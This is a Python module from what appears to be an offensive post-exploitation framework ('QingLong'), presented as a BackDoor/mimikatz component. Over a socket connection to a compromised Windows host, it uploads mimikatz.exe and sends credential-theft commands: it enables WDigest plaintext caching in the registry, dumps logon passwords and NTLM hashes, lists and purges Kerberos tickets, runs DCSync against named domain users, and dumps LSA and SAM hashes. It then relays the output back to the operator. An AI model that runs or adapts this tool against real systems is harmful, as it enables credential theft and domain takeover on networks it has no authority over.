import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import uploadCVE

from AuxiliaryFunctions import MyTable


class mimikatz:
    def __init__(self, conn):
        commands = ["upload mimikatz.exe", "show functions", "back", "show params"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/mimikatz] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice == 'upload mimikatz.exe':
                    uploadCVE.uploadCVE(conn, "upload mimikatz.exe")
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice == '1':
                    self.ModifyRegistry(conn)
                    continue
                elif choice == '2':
                    self.GrabPlaintextPasswords(conn)
                    continue
                elif choice == '3':
                    self.GetNTLM(conn)
                    continue
                elif choice == '4':
                    self.GetWdigest(conn)
                    continue
                elif choice == '5':
                    self.ShowTickets(conn)
                    continue
                elif choice == '6':
                    self.ClearTickets(conn)
                    continue
                elif choice.split()[0] == '7':
                    self.GetInformation(conn, choice.split()[1], choice.split()[2])
                    continue
                elif choice == '8':
                    self.GetHash(conn)
                    continue
                elif choice == '9':
                    self.GetHashFromSamAndSystem(conn)
                    continue
                elif choice == '10':
                    self.GetHashFromLcalSam(conn)
                    continue
                elif choice == '11':
                    self.mimikatz(conn)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["domain_name", "完整的域名"], ["username", "用户名"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Mimikatz" + '\033[0m' + "\n" + '=' * len("Mimikatz") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Modify the registry so that mimikatz can crawl plaintext", "1", "修改注册表使得mimikatz可抓取明文"],
                  ["2", "Grab plaintext passwords", "2", "抓取明文密码"],
                  ["3", "Grab user NTLM hash", "3", "抓取用户NTLM哈希"],
                  ["4", "Obtain wdigest protocol information", "4", "获取wdigest协议信息"],
                  ["5", "List tickets in the system", "5", "列出系统中的票据"],
                  ["6", "Clear tickets from the system", "6", "清除系统中的票据"],
                  ["7", "[Execute on domain controller] View detailed information of user y in domain x, including NTLM hashes, etc", "7 domain_name username", "[在域控上执行]查看x域内y用户的详细信息，包括NTLM哈希等"],
                  ["8", "[Execute on domain controller] Read the hash of all domain users", "8", "[在域控上执行]读取所有域用户的哈希"],
                  ["9", "Obtain NTLM Hash from the sam.hive and system. hive files", "9", "从sam.hive和system.hive文件中获得NTLM Hash"],
                  ["10", "Read password hash from local SAM file", "10", "从本地SAM文件中读取密码哈希"],
                  ["11", "Using mimikatz", "11", "使用mimikatz"]]
        MyTable.createTable(headers, mydata)

    # 1
    def ModifyRegistry(self, conn):
        command = "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
        self.receive(conn, command)

    # 2
    def GrabPlaintextPasswords(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
        self.receive(conn, command)

    # 3
    def GetNTLM(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::msv\" exit"
        self.receive(conn, command)

    # 4
    def GetWdigest(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" exit"
        self.receive(conn, command)

    # 5
    def ShowTickets(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"kerberos::list\" \"kerberos::tgt\" exit"
        self.receive(conn, command)

    # 6
    def ClearTickets(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"kerberos::purge\" exit"
        self.receive(conn, command)

    # 7
    def GetInformation(self, conn, domain_name, username):
        command = "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:" + domain_name + " /user:" + username + "\" exit"
        self.receive(conn, command)

    # 8
    def GetHash(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" exit"
        self.receive(conn, command)

    # 9
    def GetHashFromSamAndSystem(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"lsadump::sam /sam:sam.hive /system:system.hive\" exit"
        self.receive(conn, command)

    # 10
    def GetHashFromLcalSam(self, conn):
        command = "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
        self.receive(conn, command)

    # 11
    def mimikatz(self, conn):
        commands = ["back", "privilege::debug"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;1;1mmimikatz > \033[0m')
        while True:
            command = prompt(formatted_text1, completer=completer)
            if command == "privilege::debug":
                command1 = "mimikatz.exe \"privilege::debug\" exit"
                self.receive(conn, command1)
                continue
            elif command == "":
                continue
            elif command == 'back':
                break
            command2 = "mimikatz.exe \"privilege::debug\" \"" + command + "\" exit"
            self.receive(conn, command2)
            continue

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
